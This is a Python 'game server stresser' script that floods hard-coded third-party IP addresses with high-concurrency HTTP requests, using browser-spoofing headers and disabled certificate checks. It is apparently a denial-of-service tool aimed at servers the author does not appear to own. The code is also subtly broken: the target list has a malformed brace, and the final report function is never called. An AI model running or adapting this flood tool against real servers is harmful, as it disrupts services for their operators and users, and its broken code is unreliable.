#!/usr/bin/env python3
"""
Multi-Target Server Game Stresser Tool
======================================
Stress testing tool para sa multiple game servers
Targets:
- http://172.67.71.232/
- https://62.72.47.119/
- https://167.104.100.205/
"""

import argparse
import asyncio
import aiohttp
import ssl
import time
import random
import logging
from datetime import datetime
from typing import Optional, List, Dict, Tuple
from rich.console import Console
from rich.table import Table
from rich.panel import Panel
from rich.live import Live
from rich.layout import Layout
from rich import box
from collections import Counter, defaultdict

# ============================================
# CONFIGURATION
# ============================================

# Target servers
#TARGETS = [
#    {
#        "name": "Target 1 (HTTP)",
#        "url": "http://172.67.71.232/",
#        "protocol": "http"
#    },
#    {
#        "name": "Target 2 (HTTPS)",
#        "url": "https://62.72.47.119/",
#        "protocol": "https"
#    },
#    {
#        "name": "Target 3 (HTTPS)",
#        "url": "https://167.104.100.205/",
#        "protocol": "https"
#    }
#]

TARGETS = [
    {
    {
        "name": "Target 1 (HTTPS)",
        "url": "https://167.104.100.205/",
        "protocol": "https"
    },
]


DEFAULT_CONCURRENCY = 100  # Per target
DEFAULT_DURATION = 30
DEFAULT_RPS = 50  # Per target
DEFAULT_TIMEOUT = 10

# SSL Configuration - IGNORE SSL ERRORS
SSL_CONTEXT = ssl.create_default_context()
SSL_CONTEXT.check_hostname = False
SSL_CONTEXT.verify_mode = ssl.CERT_NONE

# Common Headers
HEADERS = {
    "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
    "accept-encoding": "gzip, deflate, br, zstd",
    "accept-language": "en-US,en;q=0.9",
    "cache-control": "max-age=0",
    "dnt": "1",
    "priority": "u=0, i",
    "sec-ch-ua": '"Not=A?Brand";v="99", "Microsoft Edge";v="151", "Chromium";v="151"',
    "sec-ch-ua-mobile": "?0",
    "sec-ch-ua-platform": '"Windows"',
    "sec-fetch-dest": "document",
    "sec-fetch-mode": "navigate",
    "sec-fetch-site": "none",
    "sec-fetch-user": "?1",
    "upgrade-insecure-requests": "1",
    "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/151.0.0.0 Safari/537.36 Edg/151.0.0.0"
}

# ============================================
# DATA CLASSES
# ============================================

class StressResult:
    def __init__(self, status: Optional[int], latency: float, error: Optional[str] = None, target: str = ""):
        self.status = status
        self.latency = latency
        self.error = error
        self.timestamp = time.time()
        self.target = target
    
    @property
    def is_success(self) -> bool:
        return self.status is not None and 200 <= self.status < 400
    
    @property
    def is_timeout(self) -> bool:
        return self.error == "timeout"
    
    @property
    def is_error(self) -> bool:
        return self.error is not None

# ============================================
# STRESSER WORKER
# ============================================

class StressWorker:
    def __init__(self, session: aiohttp.ClientSession, target: Dict, worker_id: int):
        self.session = session
        self.target = target
        self.url = target["url"]
        self.worker_id = worker_id
        self.request_count = 0
    
    async def make_request(self) -> StressResult:
        self.request_count += 1
        started = time.perf_counter()
        
        try:
            # Use SSL context for HTTPS, none for HTTP
            ssl_context = SSL_CONTEXT if self.target["protocol"] == "https" else None
            
            async with self.session.get(
                self.url,
                ssl=ssl_context,
                allow_redirects=True,
                timeout=aiohttp.ClientTimeout(total=DEFAULT_TIMEOUT)
            ) as response:
                await response.read()
                latency = time.perf_counter() - started
                return StressResult(response.status, latency, target=self.target["name"])
                
        except asyncio.TimeoutError:
            return StressResult(None, time.perf_counter() - started, "timeout", self.target["name"])
        except aiohttp.ClientError as e:
            return StressResult(None, time.perf_counter() - started, str(e), self.target["name"])
        except Exception as e:
            return StressResult(None, time.perf_counter() - started, f"error: {e}", self.target["name"])

# ============================================
# PROGRESS MONITOR
# ============================================

class MultiDashboard:
    def __init__(self, console: Console):
        self.console = console
        self.all_results: List[StressResult] = []
        self.target_results: Dict[str, List[StressResult]] = defaultdict(list)
        self.start_time = time.time()
        self.target_rps = 0
        self.concurrency = 0
        self.duration = 0
        self.running = True
        self.total_targets = len(TARGETS)
        
    def add_result(self, result: StressResult):
        self.all_results.append(result)
        self.target_results[result.target].append(result)
        
    def get_metrics(self, results: List[StressResult]) -> Dict:
        if not results:
            return {
                "total": 0,
                "success": 0,
                "errors": 0,
                "timeouts": 0,
                "rps": 0,
                "p50": 0,
                "p95": 0,
                "p99": 0,
                "avg_latency": 0,
                "min_latency": 0,
                "max_latency": 0,
                "success_rate": 0,
                "error_rate": 0,
            }
        
        latencies = [r.latency for r in results]
        total = len(results)
        successes = sum(1 for r in results if r.is_success)
        errors = sum(1 for r in results if r.is_error)
        timeouts = sum(1 for r in results if r.is_timeout)
        
        sorted_latencies = sorted(latencies)
        p50 = sorted_latencies[int(len(sorted_latencies) * 0.5)] if sorted_latencies else 0
        p95 = sorted_latencies[int(len(sorted_latencies) * 0.95)] if sorted_latencies else 0
        p99 = sorted_latencies[int(len(sorted_latencies) * 0.99)] if sorted_latencies else 0
        
        elapsed = time.time() - self.start_time
        rps = total / elapsed if elapsed > 0 else 0
        
        return {
            "total": total,
            "success": successes,
            "errors": errors,
            "timeouts": timeouts,
            "rps": rps,
            "p50": p50,
            "p95": p95,
            "p99": p99,
            "avg_latency": sum(latencies) / len(latencies) if latencies else 0,
            "min_latency": min(latencies) if latencies else 0,
            "max_latency": max(latencies) if latencies else 0,
            "success_rate": (successes / total * 100) if total > 0 else 0,
            "error_rate": (errors / total * 100) if total > 0 else 0,
        }
    
    def update(self):
        elapsed = time.time() - self.start_time
        total_requests = len(self.all_results)
        
        if total_requests == 0:
            return
        
        # Clear screen
        self.console.clear()
        
        # Header
        self.console.print(Panel.fit(
            "[bold red]🔥 MULTI-TARGET SERVER STRESSER[/bold red]\n"
            f"[white]Targets: {self.total_targets} servers[/white]\n"
            f"[white]Concurrency: {self.concurrency} per target | Total RPS: {self.target_rps * self.total_targets} | Duration: {self.duration}s[/white]\n"
            f"[white]Elapsed: {elapsed:.1f}s | Total Requests: {total_requests:,}[/white]",
            border_style="red"
        ))
        
        # Overall Metrics
        overall_metrics = self.get_metrics(self.all_results)
        overall_table = Table(title="📊 Overall Metrics", box=box.ROUNDED)
        overall_table.add_column("Metric", style="cyan")
        overall_table.add_column("Value", style="white")
        
        overall_table.add_row("Total RPS", f"{overall_metrics['rps']:.2f}")
        overall_table.add_row("Success Rate", f"{overall_metrics['success_rate']:.1f}%")
        overall_table.add_row("Error Rate", f"{overall_metrics['error_rate']:.1f}%")
        overall_table.add_row("P95 Latency", f"{overall_metrics['p95']:.3f}s")
        overall_table.add_row("P99 Latency", f"{overall_metrics['p99']:.3f}s")
        
        self.console.print(overall_table)
        
        # Per Target Metrics
        for target in TARGETS:
            target_name = target["name"]
            results = self.target_results.get(target_name, [])
            metrics = self.get_metrics(results)
            
            target_table = Table(title=f"🎯 {target_name}", box=box.MINIMAL_HEAVY_HEAD)
            target_table.add_column("Metric", style="cyan")
            target_table.add_column("Value", style="white")
            
            target_table.add_row("Requests", f"{metrics['total']:,}")
            target_table.add_row("RPS", f"{metrics['rps']:.2f}")
            target_table.add_row("Success Rate", f"{metrics['success_rate']:.1f}%")
            target_table.add_row("P95", f"{metrics['p95']:.3f}s")
            
            self.console.print(target_table)
        
        # Progress Bar
        progress = min(elapsed / self.duration, 1.0) if self.duration > 0 else 0
        bar_length = 40
        filled = int(bar_length * progress)
        bar = "█" * filled + "░" * (bar_length - filled)
        self.console.print(f"\n[bold yellow]Progress: {bar} {progress*100:.1f}%[/bold yellow]")
        
        # Status
        if self.running:
            self.console.print("[bold green]▶ STRESSING ALL TARGETS... (Press Ctrl+C to stop)[/bold green]")
        else:
            self.console.print("[bold red]⏹ STRESS COMPLETE[/bold red]")

# ============================================
# MULTI-TARGET STRESSER
# ============================================

async def stresser_worker(
    session: aiohttp.ClientSession,
    target: Dict,
    end_time: float,
    interval: float,
    dashboard: MultiDashboard,
    stop_event: asyncio.Event,
    worker_id: int,
) -> None:
    worker = StressWorker(session, target, worker_id)
    
    while time.time() < end_time and not stop_event.is_set():
        result = await worker.make_request()
        dashboard.add_result(result)
        
        if interval > 0:
            await asyncio.sleep(interval)

async def run_multi_stresser(
    targets: List[Dict],
    duration: int,
    concurrency: int,
    rps: int,
) -> None:
    dashboard = MultiDashboard(Console())
    dashboard.duration = duration
    dashboard.concurrency = concurrency
    dashboard.target_rps = rps
    dashboard.start_time = time.time()
    
    stop_event = asyncio.Event()
    start_time = time.time()
    end_time = start_time + duration
    
    # Calculate interval per target
    interval = concurrency / rps if rps > 0 else 0
    
    # Create sessions for each target
    sessions = []
    all_workers = []
    
    for target in targets:
        # Create connector with appropriate SSL settings
        ssl_context = SSL_CONTEXT if target["protocol"] == "https" else None
        connector = aiohttp.TCPConnector(
            limit=concurrency,
            limit_per_host=concurrency,
            enable_cleanup_closed=True,
            ssl=ssl_context,
        )
        
        session = aiohttp.ClientSession(
            connector=connector,
            headers=HEADERS,
        )
        sessions.append(session)
        
        # Create workers for this target
        for i in range(concurrency):
            worker = asyncio.create_task(
                stresser_worker(
                    session=session,
                    target=target,
                    end_time=end_time,
                    interval=interval,
                    dashboard=dashboard,
                    stop_event=stop_event,
                    worker_id=i,
                )
            )
            all_workers.append(worker)
    
    try:
        # Update dashboard while running
        while time.time() < end_time and not stop_event.is_set():
            dashboard.update()
            await asyncio.sleep(0.3)
    
    except KeyboardInterrupt:
        console = Console()
        console.print("\n[yellow]⚠️ Stress test stopped by user[/yellow]")
        stop_event.set()
    
    finally:
        stop_event.set()
        dashboard.running = False
        dashboard.update()
        
        # Cancel all workers
        for worker in all_workers:
            worker.cancel()
        await asyncio.gather(*all_workers, return_exceptions=True)
        
        # Close all sessions
        for session in sessions:
            await session.close()

# ============================================
# FINAL REPORT
# ============================================

def print_final_report(results: List[StressResult], console: Console, targets: List[Dict]):
    if not results:
        console.print("[red]No requests completed[/red]")
        return
    
    console.print("\n[bold green]✅ STRESS TEST COMPLETE[/bold green]")
    
    total = len(results)
    
    # Overall Report
    all_metrics = get_metrics_from_results(results, time.time() - time.time())
    # We'll recalculate properly
    
    # Get metrics properly
    latencies = [r.latency for r in results]
    successes = sum(1 for r in results if r.is_success)
    errors = sum(1 for r in results if r.is_error)
    timeouts = sum(1 for r in results if r.is_timeout)
    
    sorted_latencies = sorted(latencies)
    p50 = sorted_latencies[int(len(sorted_latencies) * 0.5)] if sorted_latencies else 0
    p95 = sorted_latencies[int(len(sorted_latencies) * 0.95)] if sorted_latencies else 0
    p99 = sorted_latencies[int(len(sorted_latencies) * 0.99)] if sorted_latencies else 0
    
    # Overall Table
    overall_table = Table(title="📊 Overall Final Report", box=box.DOUBLE_EDGE)
    overall_table.add_column("Metric", style="cyan bold")
    overall_table.add_column("Value", style="white")
    
    overall_table.add_row("Total Requests", f"{total:,}")
    overall_table.add_row("Successful", f"{successes:,} ({(successes/total*100):.1f}%)")
    overall_table.add_row("Errors", f"{errors:,} ({(errors/total*100):.1f}%)")
    overall_table.add_row("Timeouts", f"{timeouts:,} ({(timeouts/total*100):.1f}%)")
    overall_table.add_row("")
    overall_table.add_row("P50 Latency", f"{p50:.3f}s")
    overall_table.add_row("P95 Latency", f"{p95:.3f}s")
    overall_table.add_row("P99 Latency", f"{p99:.3f}s")
    overall_table.add_row("Min Latency", f"{min(latencies):.3f}s")
    overall_table.add_row("Max Latency", f"{max(latencies):.3f}s")
    overall_table.add_row("Avg Latency", f"{(sum(latencies)/len(latencies)):.3f}s")
    
    console.print(overall_table)
    
    # Per Target Report
    for target in targets:
        target_name = target["name"]
        target_results = [r for r in results if r.target == target_name]
        
        if not target_results:
            continue
        
        t_total = len(target_results)
        t_successes = sum(1 for r in target_results if r.is_success)
        t_errors = sum(1 for r in target_results if r.is_error)
        t_timeouts = sum(1 for r in target_results if r.is_timeout)
        t_latencies = [r.latency for r in target_results]
        
        t_sorted = sorted(t_latencies)
        t_p95 = t_sorted[int(len(t_sorted) * 0.95)] if t_sorted else 0
        
        target_table = Table(title=f"🎯 {target_name}", box=box.ROUNDED)
        target_table.add_column("Metric", style="cyan")
        target_table.add_column("Value", style="white")
        
        target_table.add_row("Requests", f"{t_total:,}")
        target_table.add_row("Success Rate", f"{(t_successes/t_total*100):.1f}%")
        target_table.add_row("Error Rate", f"{(t_errors/t_total*100):.1f}%")
        target_table.add_row("P95", f"{t_p95:.3f}s")
        
        console.print(target_table)
    
    # Status Codes
    status_counts = Counter(r.status for r in results if r.status is not None)
    if status_counts:
        status_table = Table(title="Status Code Distribution", box=box.ROUNDED)
        status_table.add_column("Status", style="cyan")
        status_table.add_column("Count", style="white")
        status_table.add_column("Percentage", style="white")
        
        for status, count in sorted(status_counts.items()):
            color = "green" if 200 <= status < 400 else "red" if status >= 400 else "yellow"
            status_table.add_row(
                f"[{color}]{status}[/{color}]",
                f"{count:,}",
                f"{(count/total*100):.1f}%"
            )
        console.print(status_table)

def get_metrics_from_results(results: List[StressResult], elapsed: float) -> Dict:
    if not results:
        return {}
    
    latencies = [r.latency for r in results]
    total = len(results)
    successes = sum(1 for r in results if r.is_success)
    errors = sum(1 for r in results if r.is_error)
    timeouts = sum(1 for r in results if r.is_timeout)
    
    sorted_latencies = sorted(latencies)
    p50 = sorted_latencies[int(len(sorted_latencies) * 0.5)] if sorted_latencies else 0
    p95 = sorted_latencies[int(len(sorted_latencies) * 0.95)] if sorted_latencies else 0
    p99 = sorted_latencies[int(len(sorted_latencies) * 0.99)] if sorted_latencies else 0
    
    return {
        "total": total,
        "success": successes,
        "errors": errors,
        "timeouts": timeouts,
        "rps": total / elapsed if elapsed > 0 else 0,
        "p50": p50,
        "p95": p95,
        "p99": p99,
        "avg_latency": sum(latencies) / len(latencies) if latencies else 0,
        "min_latency": min(latencies) if latencies else 0,
        "max_latency": max(latencies) if latencies else 0,
        "success_rate": (successes / total * 100) if total > 0 else 0,
        "error_rate": (errors / total * 100) if total > 0 else 0,
    }

# ============================================
# COMMAND LINE
# ============================================

def parse_args():
    parser = argparse.ArgumentParser(
        description="Multi-Target Server Game Stresser Tool",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  %(prog)s --concurrency 100 --duration 30 --rps 50
  %(prog)s --concurrency 200 --duration 60 --rps 100
  %(prog)s --concurrency 500 --duration 120 --rps 200 --timeout 5
        """
    )
    
    parser.add_argument(
        "--concurrency",
        type=int,
        default=DEFAULT_CONCURRENCY,
        help=f"Concurrent workers per target (default: {DEFAULT_CONCURRENCY})",
    )
    parser.add_argument(
        "--duration",
        type=int,
        default=DEFAULT_DURATION,
        help=f"Duration in seconds (default: {DEFAULT_DURATION})",
    )
    parser.add_argument(
        "--rps",
        type=int,
        default=DEFAULT_RPS,
        help=f"Target RPS per target (default: {DEFAULT_RPS})",
    )
    parser.add_argument(
        "--timeout",
        type=int,
        default=DEFAULT_TIMEOUT,
        help=f"Request timeout in seconds (default: {DEFAULT_TIMEOUT})",
    )
    
    return parser.parse_args()

# ============================================
# MAIN
# ============================================

async def main_async(args):
    console = Console()
    
    # Show banner
    console.print(Panel.fit(
        "[bold red]🔥 MULTI-TARGET SERVER GAME STRESSER[/bold red]\n"
        f"[white]Targets: {len(TARGETS)} servers[/white]\n"
        f"[white]Concurrency: {args.concurrency} per target[/white]\n"
        f"[white]Duration: {args.duration}s[/white]\n"
        f"[white]Target RPS: {args.rps} per target (Total: {args.rps * len(TARGETS)})[/white]\n"
        f"[white]Timeout: {args.timeout}s[/white]",
        border_style="red"
    ))
    
    # Show targets
    target_table = Table(title="🎯 Targets", box=box.ROUNDED)
    target_table.add_column("#", style="cyan")
    target_table.add_column("Name", style="white")
    target_table.add_column("URL", style="white")
    target_table.add_column("Protocol", style="white")
    
    for i, target in enumerate(TARGETS, 1):
        protocol_color = "green" if target["protocol"] == "https" else "yellow"
        target_table.add_row(
            str(i),
            target["name"],
            target["url"],
            f"[{protocol_color}]{target['protocol']}[/{protocol_color}]"
        )
    console.print(target_table)
    
    console.print("\n[yellow]⚠️ Starting stress test on ALL targets... Press Ctrl+C to stop[/yellow]\n")
    
    # Update global timeout
    global DEFAULT_TIMEOUT
    DEFAULT_TIMEOUT = args.timeout
    
    # Run stress test
    await run_multi_stresser(
        targets=TARGETS,
        duration=args.duration,
        concurrency=args.concurrency,
        rps=args.rps,
    )
    
    # Note: Results are stored in the dashboard

def main():
    args = parse_args()
    
    try:
        asyncio.run(main_async(args))
    except KeyboardInterrupt:
        console = Console()
        console.print("\n\n[yellow]⚠️ Stress test stopped by user.[/yellow]")
    except Exception as e:
        console = Console()
        console.print(f"\n[bold red]❌ Error: {e}[/bold red]")

if __name__ == "__main__":
    main()